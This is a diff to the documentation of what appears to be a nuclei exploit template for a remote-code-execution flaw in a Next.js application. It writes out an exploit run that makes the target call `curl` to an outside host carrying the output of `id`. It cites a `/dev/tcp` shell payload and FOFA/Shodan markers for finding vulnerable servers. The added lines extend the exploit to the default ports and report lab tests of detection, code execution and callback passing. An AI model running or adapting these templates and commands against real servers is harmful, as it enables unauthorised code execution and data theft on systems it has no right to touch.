@@ -52,6 +52,9 @@ nuclei -u https://target.example -t CVE-2026-94545-rce.yaml
 
 # Exploit with an explicit command (<= 71 bytes) and no Interactsh
 nuclei -u https://target.example -t CVE-2026-94545-rce.yaml -var cmd='curl http://10.0.0.5/x?i=$(id)'
+
+# Targets on the default ports are the same run, just without the port in the URL:
+#   -u https://target   (443, spelled out or not)      -u http://target   (80)
 ```
 
 ### Signing is required
@@ -248,6 +251,7 @@ nuclei" in `lab/README.md` for the same checks with the real tool).
 | Templates vs the published app source (`lab/test-upstream-app.sh`) | 6/6: detection matches (probe 2,522,895 B, ratio 114.8), exploit delivers, callback `uid=1001(user)…`, process replaced |
 | Template payload vs the advisory's `exploit.py` (`lab/compare-payload.sh`) | byte-identical for `id`, `bash -c 'id>/dev/tcp/127.0.0.1/4444'` and a 71-byte command |
 | FOFA/Shodan markers (`lab/check-dorks.sh`) | 3/3: `opengraph-image` and `self.__next_f.push` present in a real Next.js 16.3.5 HTML response |
+| Standard ports (`lab/test-standard-ports.sh`) | 13/13: HTTP :80 and HTTPS :443 (self-signed, via `tls-proxy.py`) - detection, exploit, callback, worker replaced; implicit-443 and bare-host forms included |
 
 Structural checks (`lab/tools/validate.mjs`): YAML parses, both templates validate against
 `nuclei-jsonschema.json` (vendored from the nuclei repository), and every JS block passes a
